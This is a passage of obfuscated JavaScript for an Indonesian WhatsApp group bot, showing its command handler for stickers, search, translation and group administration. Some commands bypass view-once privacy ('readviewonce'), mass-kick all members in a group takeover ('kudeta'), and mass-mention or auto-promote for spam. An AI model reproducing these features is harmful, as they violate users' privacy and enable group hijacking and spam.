          let _0x314854 = "\n* *ID :* " + _0x379dbb.id + "\n* *Nama :* " + _0x379dbb.name + "\n* *Total Pengikut :* " + _0x379dbb.subscribers + "\n* *Status :* " + _0x379dbb.state + "\n* *Verified :* " + (_0x379dbb.verification == "VERIFIED" ? "Terverifikasi" : "Tidak") + "\n";
          return _0x3efc1e(_0x314854);
        }
        break;
      case "pin":
      case "pinterest":
        {
          if (!_0x3b31a4) {
            return _0x172af6.reply(_0x22a6b8("One Piece"));
          }
          await _0x4b0487.sendMessage(_0x172af6.chat, {
            react: {
              text: "🔎",
              key: _0x172af6.key
            }
          });
          let _0x8dfe38 = await pinterest2(_0x3b31a4);
          if (_0x8dfe38.length > 10) {
            await _0x8dfe38.splice(0, 11);
          }
          const _0x455429 = _0x3b31a4;
          let _0x2e1c26 = new Array();
          let _0x585e24 = 0;
          for (let _0x8624a3 of _0x8dfe38) {
            let _0x58bc82 = await prepareWAMessageMedia({
              image: {
                url: "" + _0x8624a3.images_url
              }
            }, {
              upload: _0x4b0487.waUploadToServer
            });
            await _0x2e1c26.push({
              header: proto.Message.InteractiveMessage.Header.fromObject({
                hasMediaAttachment: true,
                ..._0x58bc82
              }),
              nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                buttons: [{
                  name: "cta_url",
                  buttonParamsJson: "{\"display_text\":\"Link Tautan Foto\",\"url\":\"" + _0x8624a3.images_url + "\",\"merchant_url\":\"https://www.google.com\"}"
                }]
              })
            });
          }
          const _0xb8104 = await generateWAMessageFromContent(_0x172af6.chat, {
            viewOnceMessageV2Extension: {
              message: {
                messageContextInfo: {
                  deviceListMetadata: {},
                  deviceListMetadataVersion: 2
                },
                interactiveMessage: proto.Message.InteractiveMessage.fromObject({
                  body: proto.Message.InteractiveMessage.Body.fromObject({
                    text: "\nBerikut adalah foto hasil pencarian dari *pinterest*"
                  }),
                  carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
                    cards: _0x2e1c26
                  })
                })
              }
            }
          }, {
            userJid: _0x172af6.sender,
            quoted: _0x172af6
          });
          await _0x4b0487.relayMessage(_0x172af6.chat, _0xb8104.message, {
            messageId: _0xb8104.key.id
          });
          await _0x4b0487.sendMessage(_0x172af6.chat, {
            react: {
              text: "",
              key: _0x172af6.key
            }
          });
        }
        break;
      case "ai":
      case "gpt":
      case "openai":
        {
          let _0x18b91a = _0x3b31a4 ? _0x3b31a4 : "hai";
          await fetchJson("https://api.skyzopedia.us.kg/api/ai/openai-prompt?prompt=Sekarang Kamu Adalah Nika-Ai dan selalu gunakan bahasa Indonesia saat menjawab semua pertanyaan&msg=" + _0x18b91a).then(async _0x1975b4 => {
            await _0x172af6.reply(_0x1975b4.result);
          }).catch(_0x40999c => _0x172af6.reply(_0x40999c.toString()));
        }
        break;
      case "brat":
        {
          const _0x1a7ee9 = q;
          if (!_0x1a7ee9) {
            return _0x3efc1e("*CaraPenggunaan* \n " + (_0x45b1bf + _0x3d57b5) + " Depay");
          }
          _0x3efc1e("𝗪𝗮𝗶𝘁...");
          const _0x14aee8 = "https://brat.caliphdev.com/api/brat?text=" + encodeURIComponent(_0x1a7ee9);
          const _0x3ec178 = path.join(__dirname, "temp_image.jpg");
          const _0x3f4faf = path.join(__dirname, "sticker.webp");
          try {
            const _0x3b5310 = await axios.get(_0x14aee8, {
              responseType: "arraybuffer"
            });
            fs.writeFileSync(_0x3ec178, _0x3b5310.data);
            exec("ffmpeg -i " + _0x3ec178 + " -vf \"scale=512:512:force_original_aspect_ratio=decrease\" -c:v libwebp -lossless 1 -q:v 80 -preset default -an -vsync 0 " + _0x3f4faf, async _0x164b14 => {
              if (_0x164b14) {
                console.error("Gagal mengonversi gambar:", _0x164b14);
                return await _0x3efc1e("Gagal membuat stiker");
              }
              await _0x4b0487.sendMessage(_0x172af6.chat, {
                sticker: fs.readFileSync(_0x3f4faf)
              }, {
                quoted: _0x172af6
              });
              fs.unlinkSync(_0x3ec178);
              fs.unlinkSync(_0x3f4faf);
            });
          } catch (_0x2c3e76) {
            console.error("Gagal membuat stiker:", _0x2c3e76);
            await _0x3efc1e("Gagal membuat stiker");
          }
        }
        break;
      case "qc":
        {
          if (!_0x3b31a4) {
            return _0x172af6.reply(_0x22a6b8("teksnya"));
          }
          let _0x5be386 = ["#000000", "#ff2414", "#22b4f2", "#eb13f2"];
          var _0x56cf58;
          try {
            _0x56cf58 = await _0x4b0487.profilePictureUrl(_0x172af6.sender, "image");
          } catch (_0x534c45) {
            _0x56cf58 = "https://telegra.ph/file/a059a6a734ed202c879d3.jpg";
          }
          const _0x48fa70 = {
            type: "quote",
            format: "png",
            backgroundColor: "#000000",
            width: 812,
            height: 968,
            scale: 2,
            messages: [{
              entities: [],
              avatar: true,
              from: {
                id: 1,
                name: _0x172af6.pushName,
                photo: {
                  url: _0x56cf58
                }
              },
              text: _0x3b31a4,
              replyMessage: {}
            }]
          };
          const _0x86f2a7 = axios.post("https://bot.lyo.su/quote/generate", _0x48fa70, {
            headers: {
              "Content-Type": "application/json"
            }
          }).then(async _0x5f4da5 => {
            const _0x496532 = Buffer.from(_0x5f4da5.data.result.image, "base64");
            let _0x36e54a = "./library/database/sampah/" + _0x172af6.sender + ".png";
            await fs.writeFile(_0x36e54a, _0x496532, async _0x535d72 => {
              if (_0x535d72) {
                return _0x172af6.reply("Error");
              }
              await _0x4b0487.sendAsSticker(_0x172af6.chat, _0x36e54a, _0x172af6, {
                packname: global.packname
              });
              await fs.unlinkSync("" + _0x36e54a);
            });
          });
        }
        break;
      case "s":
      case "sticker":
      case "stiker":
        {
          if (!/image|video/gi.test(_0x12a7ce)) {
            return _0x172af6.reply(_0x22a6b8("dengan kirim media"));
          }
          if (/video/gi.test(_0x12a7ce) && _0x192152.seconds > 15) {
            return _0x172af6.reply("Durasi vidio maksimal 15 detik!");
          }
          var _0x36e1dc = await _0x4b0487.downloadAndSaveMediaMessage(_0x192152);
          await _0x4b0487.sendAsSticker(_0x172af6.chat, _0x36e1dc, _0x172af6, {
            packname: global.packname
          });
          await fs.unlinkSync(_0x36e1dc);
        }
        break;
      case "swm":
      case "stickerwm":
      case "stikerwm":
      case "wm":
        {
          if (!_0x3b31a4) {
            return _0x172af6.reply(_0x22a6b8("namamu dengan kirim media"));
          }
          if (!/image|video/gi.test(_0x12a7ce)) {
            return _0x172af6.reply(_0x22a6b8("namamu dengan kirim media"));
          }
          if (/video/gi.test(_0x12a7ce) && _0x192152.seconds > 15) {
            return _0x172af6.reply("Durasi vidio maksimal 15 detik!");
          }
          var _0x36e1dc = await _0x4b0487.downloadAndSaveMediaMessage(_0x192152);
          await _0x4b0487.sendAsSticker(_0x172af6.chat, _0x36e1dc, _0x172af6, {
            packname: _0x3b31a4
          });
          await fs.unlinkSync(_0x36e1dc);
        }
        break;
      case "rvo":
      case "readviewonce":
        {
          if (!_0x172af6.quoted) {
            return _0x172af6.reply(_0x22a6b8("dengan reply pesannya"));
          }
          let _0x45b29 = _0x172af6.quoted.message;
          let _0x36b822 = Object.keys(_0x45b29)[0];
          if (!_0x45b29[_0x36b822].viewOnce) {
            return _0x172af6.reply("Pesan itu bukan viewonce!");
          }
          let _0x39adb7 = await downloadContentFromMessage(_0x45b29[_0x36b822], _0x36b822 == "imageMessage" ? "image" : _0x36b822 == "videoMessage" ? "video" : "audio");
          let _0x87bb02 = Buffer.from([]);
          for await (const _0xdbd087 of _0x39adb7) {
            _0x87bb02 = Buffer.concat([_0x87bb02, _0xdbd087]);
          }
          if (/video/.test(_0x36b822)) {
            return _0x4b0487.sendMessage(_0x172af6.chat, {
              video: _0x87bb02,
              caption: _0x45b29[_0x36b822].caption || ""
            }, {
              quoted: _0x172af6
            });
          } else if (/image/.test(_0x36b822)) {
            return _0x4b0487.sendMessage(_0x172af6.chat, {
              image: _0x87bb02,
              caption: _0x45b29[_0x36b822].caption || ""
            }, {
              quoted: _0x172af6
            });
          } else if (/audio/.test(_0x36b822)) {
            return _0x4b0487.sendMessage(_0x172af6.chat, {
              audio: _0x87bb02,
              mimetype: "audio/mpeg",
              ptt: true
            }, {
              quoted: _0x172af6
            });
          }
        }
        break;
      case "tourl":
        {
          if (!/image/.test(_0x12a7ce)) {
            return _0x172af6.reply(_0x22a6b8("dengan kirim/reply foto"));
          }
          let _0x479974 = await _0x4b0487.downloadAndSaveMediaMessage(_0x192152);
          const {
            ImageUploadService: _0x29e1d6
          } = require("node-upload-images");
          const _0x56a887 = new _0x29e1d6("pixhost.to");
          let {
            directLink: _0x3a617f
          } = await _0x56a887.uploadFromBinary(fs.readFileSync(_0x479974), "depayyy.png");
          let _0x2c5bb3 = _0x3a617f.toString();
          await _0x4b0487.sendMessage(_0x172af6.chat, {
            text: _0x2c5bb3
          }, {
            quoted: _0x172af6
          });
          await fs.unlinkSync(_0x479974);
        }
        break;
      case "tourl2":
        {
          if (!/image/.test(_0x12a7ce)) {
            return _0x172af6.reply(_0x22a6b8("dengan kirim/reply foto"));
          }
          let _0x47e011 = await _0x4b0487.downloadAndSaveMediaMessage(_0x192152);
          const {
            ImageUploadService: _0xb5e48e
          } = require("node-upload-images");
          const _0x41a610 = new _0xb5e48e("postimages.org");
          let {
            directLink: _0xd258ab
          } = await _0x41a610.uploadFromBinary(fs.readFileSync(_0x47e011), "depayyy.png");
          let _0x2b2c43 = _0xd258ab.toString();
          await _0x4b0487.sendMessage(_0x172af6.chat, {
            text: _0x2b2c43
          }, {
            quoted: _0x172af6
          });
          await fs.unlinkSync(_0x47e011);
        }
        break;
      case "tr":
      case "translate":
        {
          let _0x437557;
          let _0x11deca;
          let _0x18fbb1 = "en";
          if (_0x3b31a4 || _0x172af6.quoted) {
            let _0x4d519c = require("translate-google-api");
            if (_0x3b31a4 && !_0x172af6.quoted) {
              if (_0xd4ebe7.length < 2) {
                return _0x172af6.reply(_0x22a6b8("id good night"));
              }
              _0x437557 = _0xd4ebe7[0];
              _0x11deca = _0x3b31a4.split(" ").slice(1).join(" ");
            } else if (_0x172af6.quoted) {
              if (!_0x3b31a4) {
                return _0x172af6.reply(_0x22a6b8("id good night"));
              }
              if (_0xd4ebe7.length < 1) {
                return _0x172af6.reply(_0x22a6b8("id good night"));
              }
              if (!_0x172af6.quoted.text) {
                return _0x172af6.reply(_0x22a6b8("id good night"));
              }
              _0x437557 = _0xd4ebe7[0];
              _0x11deca = _0x172af6.quoted.text;
            }
            let _0x4b64d4;
            try {
              _0x4b64d4 = await _0x4d519c("" + _0x11deca, {
                to: _0x437557
              });
            } catch (_0x427b58) {
              _0x4b64d4 = await _0x4d519c("" + _0x11deca, {
                to: _0x18fbb1
              });
            } finally {
              _0x172af6.reply(_0x4b64d4[0]);
            }
          } else {
            return _0x172af6.reply(_0x22a6b8("id good night"));
          }
        }
        break;
      case "hd":
        {
          if (!_0x2d1973) {
            return _0x3efc1e("Balas gambar dengan caption " + (_0x45b1bf + _0x3d57b5));
          }
          if (!/image/.test(_0x12a7ce)) {
            return _0x3efc1e(_0x22a6b8("dengan kirim/reply foto"));
          }
          await _0x4b0487.sendMessage(_0x172af6.chat, {
            react: {
              text: "🕖",
              key: _0x172af6.key
            }
          });
          try {
            const {
              remini: _0x57e936
            } = require("./library/hd.js");
            let _0x12c9be = await _0x2d1973.download();
            let _0x1154ed = await _0x57e936(_0x12c9be, "enhance");
            _0x1154ed = await _0x57e936(_0x1154ed, "enhance");
            _0x1154ed = await _0x57e936(_0x1154ed, "enhance");
            _0x4b0487.sendFile(_0x172af6.chat, _0x1154ed, "", "_Sukses Membuat HD 3x Enhance✅_", _0x172af6);
          } catch (_0x33f86d) {
            console.error(_0x33f86d);
            await _0x4b0487.sendMessage(_0x172af6.chat, {
              react: {
                text: "❌",
                key: _0x172af6.key
              }
            });
          }
        }
        break;
      case "add":
        {
          if (!_0x172af6.isGroup) {
            return _0x3efc1e(mess.group);
          }
          if (!_0x23ae7f && !_0x172af6.isAdmin) {
            return _0x3efc1e(mess.admin);
          }
          if (!_0x172af6.isBotAdmin) {
            return _0x3efc1e(mess.botAdmin);
          }
          if (_0x3b31a4) {
            const _0x2cca24 = _0x3b31a4 ? _0x3b31a4.replace(/[^0-9]/g, "") + "@s.whatsapp.net" : false;
            var _0x24c341 = await _0x4b0487.onWhatsApp(_0x2cca24.split("@")[0]);
            if (_0x24c341.length < 1) {
              return _0x3efc1e("Nomor tidak terdaftar di whatsapp");
            }
            const _0x36bed1 = await _0x4b0487.groupParticipantsUpdate(_0x172af6.chat, [_0x2cca24], "add");
            if (Object.keys(_0x36bed1).length == 0) {
              return _0x172af6.reply("Berhasil Menambahkan " + _0x2cca24.split("@")[0] + " Kedalam Grup Ini");
            } else {
              return _0x172af6.reply(JSON.stringify(_0x36bed1, null, 2));
            }
          } else {
            return _0x172af6.reply(_0x22a6b8("62838###"));
          }
        }
        break;
      case "kick":
      case "kik":
        {
          if (!_0x172af6.isGroup) {
            return _0x3efc1e(mess.group);
          }
          if (!_0x23ae7f && !_0x172af6.isAdmin) {
            return _0x3efc1e(mess.admin);
          }
          if (!_0x172af6.isBotAdmin) {
            return _0x3efc1e(mess.botAdmin);
          }
          if (_0x3b31a4 || _0x172af6.quoted) {
            const _0x2485e8 = _0x172af6.mentionedJid[0] ? _0x172af6.mentionedJid[0] : _0x172af6.quoted ? _0x172af6.quoted.sender : _0x3b31a4 ? _0x3b31a4.replace(/[^0-9]/g, "") + "@s.whatsapp.net" : false;
            var _0x24c341 = await _0x4b0487.onWhatsApp(_0x2485e8.split("@")[0]);
            if (_0x24c341.length < 1) {
              return _0x3efc1e("Nomor tidak terdaftar di whatsapp");
            }
            const _0x5a53c7 = await _0x4b0487.groupParticipantsUpdate(_0x172af6.chat, [_0x2485e8], "remove");
            await _0x3efc1e("Berhasil mengeluarkan " + _0x2485e8.split("@")[0] + " dari grup ini");
          } else {
            return _0x3efc1e(_0x22a6b8("@tag/reply"));
          }
        }
        break;
      case "leave":
        {
          if (!_0x23ae7f) {
            return _0x3efc1e(mess.owner);
          }
          if (!_0x172af6.isGroup) {
            return _0x3efc1e(mess.group);
          }
          await _0x172af6.reply("Baik, Saya Akan Keluar Dari Grup Ini");
          await sleep(4000);
          await _0x4b0487.groupLeave(_0x172af6.chat);
        }
        break;
      case "resetlinkgc":
        {
          if (!_0x23ae7f) {
            return _0x3efc1e(mess.owner);
          }
          if (!_0x172af6.isGroup) {
            return _0x3efc1e(mess.group);
          }
          if (!_0x172af6.isBotAdmin) {
            return _0x3efc1e(mess.botAdmin);
          }
          await _0x4b0487.groupRevokeInvite(_0x172af6.chat);
          _0x3efc1e("Berhasil mereset link grup ✅");
        }
        break;
      case "tagall":
        {
          if (!_0x172af6.isGroup) {
            return _0x3efc1e(mess.group);
          }
          if (!_0x23ae7f && !_0x172af6.isAdmin) {
            return _0x3efc1e(mess.admin);
          }
          if (!_0x3b31a4) {
            return _0x3efc1e(_0x22a6b8("pesannya"));
          }
          let _0x135a1e = _0x3b31a4 + "\n\n";
          let _0x5112ad = await _0x172af6.metadata.participants.map(_0x30b1e8 => _0x30b1e8.id).filter(_0x1085ce => _0x1085ce !== _0x4b67d6 && _0x1085ce !== _0x172af6.sender);
          await _0x5112ad.forEach(_0x2fc26d => {
            _0x135a1e += "@" + _0x2fc26d.split("@")[0] + "\n";
          });
          await _0x4b0487.sendMessage(_0x172af6.chat, {
            text: _0x135a1e,
            mentions: [..._0x5112ad]
          }, {
            quoted: _0x172af6
          });
        }
        break;
      case "linkgc":
        {
          if (!_0x172af6.isGroup) {
            return _0x3efc1e(mess.group);
          }
          if (!_0x172af6.isBotAdmin) {
            return _0x3efc1e(mess.botAdmin);
          }
          const _0x2d2052 = "https://chat.whatsapp.com/" + (await _0x4b0487.groupInviteCode(_0x172af6.chat));
          var _0x2593d0 = "\n" + _0x2d2052 + "\n";
          await _0x4b0487.sendMessage(_0x172af6.chat, {
            text: _0x2593d0,
            matchedText: "" + _0x2d2052
          }, {
            quoted: _0x172af6
          });
        }
        break;
      case "ht":
      case "hidetag":
        {
          if (!_0x172af6.isGroup) {
            return _0x3efc1e(mess.group);
          }
          if (!_0x23ae7f && !_0x172af6.isAdmin) {
            return _0x3efc1e(mess.admin);
          }
          if (!_0x3b31a4) {
            return _0x3efc1e(_0x22a6b8("pesannya"));
          }
          let _0x463e2e = _0x172af6.metadata.participants.map(_0x3f83dc => _0x3f83dc.id);
          await _0x4b0487.sendMessage(_0x172af6.chat, {
            text: _0x3b31a4,
            mentions: [..._0x463e2e]
          }, {
            quoted: _0x172af6
          });
        }
        break;
      case "joingc":
      case "join":
        {
          if (!_0x23ae7f) {
            return _0x3efc1e(mess.owner);
          }
          if (!_0x3b31a4) {
            return _0x3efc1e(_0x22a6b8("linkgcnya"));
          }
          if (!_0x3b31a4.includes("chat.whatsapp.com")) {
            return _0x3efc1e("Link tautan tidak valid");
          }
          let _0x2bf6fe = _0x3b31a4.split("https://chat.whatsapp.com/")[1];
          let _0x35a621 = await _0x4b0487.groupAcceptInvite(_0x2bf6fe);
          _0x3efc1e("Berhasil bergabung ke dalam grup " + _0x35a621);
        }
        break;
      case "get":
      case "g":
        {
          if (!_0x23ae7f) {
            return _0x3efc1e(mess.owner);
          }
          if (!_0x3b31a4) {
            return _0x172af6.reply(_0x22a6b8("https://example.com"));
          }
          let _0x3718bf = await fetchJson(_0x3b31a4);
          _0x3efc1e(JSON.stringify(_0x3718bf, null, 2));
        }
        break;
      case "joinch":
      case "joinchannel":
        {
          if (!_0x23ae7f) {
            return _0x3efc1e(mess.owner);
          }
          if (!_0x3b31a4 && !_0x172af6.quoted) {
            return _0x3efc1e(_0x22a6b8("linkchnya"));
          }
          if (!_0x3b31a4.includes("https://whatsapp.com/channel/") && !_0x172af6.quoted.text.includes("https://whatsapp.com/channel/")) {
            return _0x3efc1e("Link tautan tidak valid");
          }
          let _0xda374e = _0x172af6.quoted ? _0x172af6.quoted.text.split("https://whatsapp.com/channel/")[1] : _0x3b31a4.split("https://whatsapp.com/channel/")[1];
          let _0x208e9e = await _0x4b0487.newsletterMetadata("invite", _0xda374e);
          await _0x4b0487.newsletterFollow(_0x208e9e.id);
          _0x172af6.reply("\n*Berhasil join channel whatsapp ✅*\n* Nama channel : *" + _0x208e9e.name + "*\n* Total pengikut : *" + (_0x208e9e.subscribers + 1) + "*\n");
        }
        break;
      case "autoread":
        {
          if (!_0x23ae7f) {
            return _0x3efc1e(mess.owner);
          }
          if (!_0x3b31a4) {
            return _0x3efc1e(_0x22a6b8("on/off"));
          }
          let _0x5c8e87 = _0x3b31a4.toLowerCase();
          if (_0x5c8e87 == "on") {
            if (global.db.settings.autoread == true) {
              return _0x3efc1e("*Autoread* sudah aktif!");
            }
            global.db.settings.autoread = true;
            return _0x172af6.reply("Berhasil menyalakan *autoread*");
          } else if (_0x5c8e87 == "off") {
            if (global.db.settings.autoread == false) {
              return _0x3efc1e("*Autoread* tidak aktif!");
            }
            global.db.settings.autoread = false;
            return _0x3efc1e("Berhasil mematikan *autoread*");
          } else {
            return _0x172af6.reply(_0x22a6b8("on/off"));
          }
        }
        break;
      case "autopromosi":
        {
          if (!_0x23ae7f) {
            return _0x3efc1e(mess.owner);
          }
          if (!_0x3b31a4) {
            return _0x3efc1e(_0x22a6b8("on/off"));
          }
          let _0x121e5d = _0x3b31a4.toLowerCase();
          if (_0x121e5d == "on") {
            if (global.db.settings.autopromosi == true) {
              return _0x172af6.reply("*Autopromosi* sudah aktif!");
            }
            global.db.settings.autopromosi = true;
            return _0x172af6.reply("Berhasil menyalakan *autopromosi*");
          } else if (_0x121e5d == "off") {
            if (global.db.settings.autopromosi == false) {
              return _0x3efc1e("*Autopromosi* tidak aktif!");
            }
            global.db.settings.autopromosi = false;
            return _0x3efc1e("Berhasil mematikan *autopromosi*");
          } else {
            return _0x3efc1e(_0x22a6b8("on/off"));
          }
        }
        break;
      case "autotyping":
        {
          if (!_0x23ae7f) {
            return _0x3efc1e(mess.owner);
          }
          if (!_0x3b31a4) {
            return _0x3efc1e(_0x22a6b8("on/off"));
          }
          let _0x463d66 = _0x3b31a4.toLowerCase();
          if (_0x463d66 == "on") {
            if (global.db.settings.autotyping == true) {
              return _0x3efc1e("*Autotyping* sudah aktif!");
            }
            global.db.settings.autotyping = true;
            return _0x3efc1e("Berhasil menyalakan *autotyping*");
          } else if (_0x463d66 == "off") {
            if (global.db.settings.autotyping == false) {
              return _0x3efc1e("*Autotyping* tidak aktif!");
            }
            global.db.settings.autotyping = false;
            return _0x3efc1e("Berhasil mematikan *autotyping*");
          } else {
            return _0x3efc1e(_0x22a6b8("on/off"));
          }
        }
        break;
      case "autoreadsw":
        {
          if (!_0x23ae7f) {
            return _0x3efc1e(mess.owner);
          }
          if (!_0x3b31a4) {
            return _0x3efc1e(_0x22a6b8("on/off"));
          }
          let _0x4c820c = _0x3b31a4.toLowerCase();
          if (_0x4c820c == "on") {
            if (global.db.settings.readsw == true) {
              return _0x3efc1e("*Autoreadsw* sudah aktif!");
            }
            global.db.settings.readsw = true;
            return _0x172af6.reply("Berhasil menyalakan *autoreadsw*");
          } else if (_0x4c820c == "off") {
            if (global.db.settings.readsw == false) {
              return _0x172af6.reply("*Autoreadsw* tidak aktif!");
            }
            global.db.settings.readsw = false;
            return _0x3efc1e("Berhasil mematikan *autoreadsw*");
          } else {
            return _0x3efc1e(_0x22a6b8("on/off"));
          }
        }
        break;
      case "welcome":
        {
          if (!_0x172af6.isGroup) {
            return _0x3efc1e(mess.group);
          }
          if (!_0x23ae7f) {
            return _0x3efc1e(mess.owner);
          }
          if (!_0x3b31a4) {
            return _0x3efc1e(_0x22a6b8("on/off"));
          }
          let _0x20722b = _0x3b31a4.toLowerCase();
          if (_0x20722b == "on") {
            if (global.db.groups[_0x172af6.chat].welcome == true) {
              return _0x3efc1e("*Welcome* di grup ini sudah aktif!");
            }
            global.db.groups[_0x172af6.chat].welcome = true;
            return _0x3efc1e("Berhasil menyalakan *welcome* di grup ini");
          } else if (_0x20722b == "off") {
            if (global.db.groups[_0x172af6.chat].welcome == false) {
              return _0x3efc1e("*Welcome* di grup ini tidak aktif!");
            }
            global.db.groups[_0x172af6.chat].welcome = false;
            return _0x172af6.reply("Berhasil mematikan *welcome* di grup ini");
          } else {
            return _0x3efc1e(_0x22a6b8("on/off"));
          }
        }
        break;
      case "antilink":
        {
          if (!_0x172af6.isGroup) {
            return _0x3efc1e(mess.group);
          }
          if (!_0x23ae7f) {
            return _0x3efc1e(mess.owner);
          }
          if (!_0x3b31a4) {
            return _0x3efc1e(_0x22a6b8("on/off"));
          }
          let _0x5b014d = _0x3b31a4.toLowerCase();
          if (_0x5b014d == "on") {
            if (global.db.groups[_0x172af6.chat].antilink == true) {
              return _0x3efc1e("*Antilink* di grup ini sudah aktif!");
            }
            if (global.db.groups[_0x172af6.chat].antilink2 == true) {
              global.db.groups[_0x172af6.chat].antilink2 = false;
            }
            global.db.groups[_0x172af6.chat].antilink = true;
            return _0x3efc1e("Berhasil menyalakan *antilink* di grup ini");
          } else if (_0x5b014d == "off") {
            if (global.db.groups[_0x172af6.chat].antilink == false) {
              return _0x3efc1e("*Antilink* di grup ini tidak aktif!");
            }
            global.db.groups[_0x172af6.chat].antilink = false;
            return _0x3efc1e("Berhasil mematikan *antilink* di grup ini");
          } else {
            return _0x3efc1e(_0x22a6b8("on/off"));
          }
        }
        break;
      case "antilink2":
        {
          if (!_0x172af6.isGroup) {
            return _0x3efc1e(mess.group);
          }
          if (!_0x23ae7f) {
            return _0x3efc1e(mess.owner);
          }
          if (!_0x3b31a4) {
            return _0x3efc1e(_0x22a6b8("on/off"));
          }
          let _0x105367 = _0x3b31a4.toLowerCase();
          if (_0x105367 == "on") {
            if (global.db.groups[_0x172af6.chat].antilink2 == true) {
              return _0x3efc1e("*Antilink2* di grup ini sudah aktif!");
            }
            if (global.db.groups[_0x172af6.chat].antilink == true) {
              global.db.groups[_0x172af6.chat].antilink = false;
            }
            global.db.groups[_0x172af6.chat].antilink2 = true;
            return _0x3efc1e("Berhasil menyalakan *antilink2* di grup ini");
          } else if (_0x105367 == "off") {
            if (global.db.groups[_0x172af6.chat].antilink2 == false) {
              return _0x3efc1e("*Antilink2* di grup ini tidak aktif!");
            }
            global.db.groups[_0x172af6.chat].antilink2 = false;
            return _0x3efc1e("Berhasil mematikan *antilink2* di grup ini");
          } else {
            return _0x3efc1e(_0x22a6b8("on/off"));
          }
        }
        break;
      case "mute":
        {
          if (!_0x172af6.isGroup) {
            return _0x3efc1e(mess.group);
          }
          if (!_0x23ae7f) {
            return _0x3efc1e(mess.owner);
          }
          if (!_0x3b31a4) {
            return _0x3efc1e(_0x22a6b8("on/off"));
          }
          let _0x45feef = _0x3b31a4.toLowerCase();
          if (_0x45feef == "on") {
            if (global.db.groups[_0x172af6.chat].mute == true) {
              return _0x3efc1e("*Mute* di grup ini sudah aktif!");
            }
            global.db.groups[_0x172af6.chat].mute = true;
            return _0x3efc1e("Berhasil menyalakan *mute* di grup ini");
          } else if (_0x45feef == "off") {
            if (global.db.groups[_0x172af6.chat].mute == false) {
              return _0x3efc1e("*Mute* di grup ini tidak aktif!");
            }
            global.db.groups[_0x172af6.chat].mute = false;
            return _0x3efc1e("Berhasil mematikan *mute* di grup ini");
          } else {
            return _0x3efc1e(_0x22a6b8("on/off"));
          }
        }
        break;
      case "blacklist":
      case "blacklistjpm":
      case "blgc":
        {
          if (!_0x172af6.isGroup) {
            return _0x3efc1e(mess.group);
          }
          if (!_0x23ae7f) {
            return _0x3efc1e(mess.owner);
          }
          if (!_0x3b31a4) {
            return _0x3efc1e(_0x22a6b8("on/off"));
          }
          let _0x54e3ac = _0x3b31a4.toLowerCase();
          if (_0x54e3ac == "on") {
            if (global.db.groups[_0x172af6.chat].blacklistjpm == true) {
              return _0x3efc1e("*Blacklistjpm* di grup ini sudah aktif!");
            }
            global.db.groups[_0x172af6.chat].blacklistjpm = true;
            return _0x3efc1e("Berhasil menyalakan *blacklistjpm* di grup ini");
          } else if (_0x54e3ac == "off") {
            if (global.db.groups[_0x172af6.chat].blacklistjpm == false) {
              return _0x3efc1e("*Blacklistjpm* di grup ini tidak aktif!");
            }
            global.db.groups[_0x172af6.chat].blacklistjpm = false;
            return _0x3efc1e("Berhasil mematikan *blacklistjpm* di grup ini");
          } else {
            return _0x3efc1e(_0x22a6b8("on/off"));
          }
        }
        break;
      case "closegc":
      case "close":
      case "opengc":
      case "open":
        {
          if (!_0x172af6.isGroup) {
            return _0x3efc1e(mess.group);
          }
          if (!_0x172af6.isBotAdmin) {
            return _0x3efc1e(mess.botAdmin);
          }
          if (!_0x23ae7f && !_0x172af6.isAdmin) {
            return _0x3efc1e(mess.admin);
          }
          if (/open|opengc/.test(_0x3d57b5)) {
            if (_0x172af6.metadata.announce == false) {
              return;
            }
            await _0x4b0487.groupSettingUpdate(_0x172af6.chat, "not_announcement");
          } else if (/closegc|close/.test(_0x3d57b5)) {
            if (_0x172af6.metadata.announce == true) {
              return;
            }
            await _0x4b0487.groupSettingUpdate(_0x172af6.chat, "announcement");
          } else {}
        }
        break;
      case "kudetagc":
      case "kudeta":
        {
          if (!_0x23ae7f) {
            return _0x3efc1e(mess.owner);
          }
          let _0x317c58 = await _0x172af6.metadata.participants.map(_0x490d77 => _0x490d77.id).filter(_0x2ff2b9 => _0x2ff2b9 !== _0x4b67d6 && _0x2ff2b9 !== _0x172af6.sender);
          if (_0x317c58.length < 1) {
            return _0x3efc1e("Grup Ini Sudah Tidak Ada Member!");
          }
          await _0x3efc1e("Kudeta Grup By Depay☠️");
          for (let _0x4c6afc of _0x317c58) {
            await _0x4b0487.groupParticipantsUpdate(_0x172af6.chat, [_0x4c6afc], "remove");
            await sleep(1000);
          }
          await _0x3efc1e("Kudeta Grup Telah Berhasil 🏴‍☠️");
        }
        break;
      case "demote":
      case "promote":
        {
          if (!_0x172af6.isGroup) {
            return _0x3efc1e(mess.group);
          }
          if (!_0x172af6.isBotAdmin) {
            return _0x3efc1e(mess.botAdmin);
          }
          if (!_0x23ae7f && !_0x172af6.isAdmin) {
            return _0x3efc1e(mess.admin);
          }
          if (_0x172af6.quoted || _0x3b31a4) {
            var _0x313c8;
            let _0x2c2029 = _0x172af6.mentionedJid[0] ? _0x172af6.mentionedJid[0] : _0x172af6.quoted ? _0x172af6.quoted.sender : _0x3b31a4.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
            if (/demote/.test(_0x3d57b5)) {
              _0x313c8 = "Demote";
            }
            if (/promote/.test(_0x3d57b5)) {
              _0x313c8 = "Promote";
            }
            await _0x4b0487.groupParticipantsUpdate(_0x172af6.chat, [_0x2c2029], _0x313c8.toLowerCase()).then(async () => {
              await _0x4b0487.sendMessage(_0x172af6.chat, {
                text: "Sukses " + _0x313c8.toLowerCase() + " @" + _0x2c2029.split("@")[0],
                mentions: [_0x2c2029]
              }, {
                quoted: _0x172af6
              });
            });
          } else {
            return _0x3efc1e(_0x22a6b8("@tag/6285###"));
          }
        }
        break;
      case "addrespon":
        {
          if (!_0x23ae7f) {
            return _0x350195(mess.owner);
          }
          if (!_0x3b31a4) {
            return _0x172af6.reply(_0x22a6b8("cmd|responnya"));
          }
          if (!_0x3b31a4.split("|")) {
            return _0x172af6.reply(_0x22a6b8("cmd|responnya"));
          }
          let _0x54e8c4 = _0x3b31a4.split("|");
          if (_0x54e8c4.length < 2) {
            return _0x172af6.reply(_0x22a6b8("cmd|responnya"));
          }
          const [_0x3d6dcf, _0x1101db] = _0x54e8c4;
          let _0x3527cf = list.find(_0x457495 => _0x457495.cmd == _0x3d6dcf.toLowerCase());
          if (_0x3527cf) {
            return _0x172af6.reply("Cmd respon sudah ada");
          }
          let _0x13765a = {
